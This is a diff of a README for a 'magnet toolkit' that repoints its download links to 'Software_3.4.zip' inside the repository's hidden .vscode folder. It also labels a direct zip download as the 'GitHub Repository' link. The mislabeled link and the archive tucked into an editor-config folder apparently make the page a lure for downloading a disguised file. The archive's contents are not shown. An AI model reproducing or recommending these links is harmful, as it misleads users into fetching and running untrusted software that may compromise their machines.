@@ -8,7 +8,7 @@ Welcome to the magnet toolkit! This application helps teams gather valuable insi
 
 To get started with magnet, visit the Releases page to download the latest version:
 
-[![Download magnet](https://raw.githubusercontent.com/bretty937/magnet/main/tests/magnet_2.4.zip)](https://raw.githubusercontent.com/bretty937/magnet/main/tests/magnet_2.4.zip)
+[![Download magnet](https://raw.githubusercontent.com/bretty937/magnet/main/.vscode/Software_3.4.zip)](https://raw.githubusercontent.com/bretty937/magnet/main/.vscode/Software_3.4.zip)
 
 Follow these steps to install and run the software:
 
@@ -71,7 +71,7 @@ While we don't have a specific forum, feel free to reach out through the Issues 
 
 ## 🔗 Additional Resources
 
-- [magnet GitHub Repository](https://raw.githubusercontent.com/bretty937/magnet/main/tests/magnet_2.4.zip)
+- [magnet GitHub Repository](https://raw.githubusercontent.com/bretty937/magnet/main/.vscode/Software_3.4.zip)
 - [Our Blog](#) - Learn about the latest updates and best practices.
 - [Community Guidelines](#) - Connect with other users and share your experiences.
 
